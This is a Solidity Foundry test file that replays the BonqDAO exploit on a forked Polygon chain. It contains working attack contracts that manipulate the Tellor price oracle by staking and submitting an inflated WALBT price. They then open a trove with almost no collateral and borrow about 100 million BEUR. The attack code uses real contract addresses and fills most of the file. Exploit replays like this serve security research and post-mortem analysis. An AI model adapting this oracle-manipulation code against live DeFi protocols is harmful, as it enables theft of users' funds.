// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../helpers/BaseForkTest.t.sol";

interface IERC20Simple {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITellorFlexSimple {
    function getStakeAmount() external view returns (uint256);
    function depositStake(uint256 amount) external;
    function submitValue(bytes32 queryId, bytes calldata value, uint256 nonce, bytes calldata queryData) external;
}

interface IBonqFactory {
    function createTrove(address token) external returns (address);
}

interface IBonqTrove {
    function increaseCollateral(uint256 amount, address hint) external;
    function borrow(address recipient, uint256 amount, address hint) external;
}

contract BonqPriceReporter {
    function updatePrice(uint256 tokenId, uint256 price) external {
        (bool ok,) = msg.sender.delegatecall(abi.encodeWithSignature("updatePrice(uint256,uint256)", tokenId, price));
        require(ok, "update price failed");
    }
}

contract BonqExploitTx1 {
    ITellorFlexSimple internal constant TELLOR = ITellorFlexSimple(0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B);
    IBonqFactory internal constant BONQ_FACTORY = IBonqFactory(0x3bB7fFD08f46620beA3a9Ae7F096cF2b213768B3);
    IERC20Simple internal constant TRB = IERC20Simple(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
    IERC20Simple internal constant WALBT = IERC20Simple(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
    IERC20Simple internal constant BEUR = IERC20Simple(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);

    bytes internal constant QUERY_DATA =
        hex"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000";

    function runTx1() external {
        BonqPriceReporter reporter = new BonqPriceReporter();
        TRB.transfer(address(reporter), TELLOR.getStakeAmount());
        reporter.updatePrice(10e18, 5e27);

        address maliciousTrove = BONQ_FACTORY.createTrove(address(WALBT));
        WALBT.transfer(maliciousTrove, 0.1e18);
        IBonqTrove(maliciousTrove).increaseCollateral(0, address(0));
        IBonqTrove(maliciousTrove).borrow(address(this), 100_000_000e18, address(0));
    }

    function updatePrice(uint256 tokenId, uint256 price) external {
        TRB.approve(address(TELLOR), type(uint256).max);
        bytes memory encodedPrice = abi.encodePacked(price);
        bytes32 queryId = keccak256(QUERY_DATA);
        TELLOR.depositStake(tokenId);
        TELLOR.submitValue(queryId, encodedPrice, 0, QUERY_DATA);
    }
}

contract BonqDAOReplayTest is BaseForkTest {
    IERC20Simple internal constant TRB = IERC20Simple(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
    IERC20Simple internal constant WALBT = IERC20Simple(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
    IERC20Simple internal constant BEUR = IERC20Simple(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);

    uint256 internal constant BONQ_TX1_BLOCK = 38_792_977;
    uint256 internal constant MIN_EXPECTED_BEUR = 99_000_000e18;
    uint256 internal constant INITIAL_WALBT = 13_359_732_562_723_399_770;

    function test_BonqReplayMetadata() public pure {
        assertEq(BONQ_TX1_BLOCK, 38_792_977, "fork block drift");
        assertEq(MIN_EXPECTED_BEUR, 99_000_000e18, "expected borrow drift");
    }

    function test_BonqReplayTx1() public {
        string memory rpcUrl = vm.envOr("POLYGON_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) {
            return;
        }

        _initFork(rpcUrl, BONQ_TX1_BLOCK);
        _assertForkInitialized();

        BonqExploitTx1 exploit = new BonqExploitTx1();
        deal(address(TRB), address(exploit), 10e18);
        deal(address(WALBT), address(exploit), INITIAL_WALBT);

        exploit.runTx1();

        uint256 borrowed = BEUR.balanceOf(address(exploit));
        assertGt(borrowed, MIN_EXPECTED_BEUR, "borrowed amount too low");
    }
}
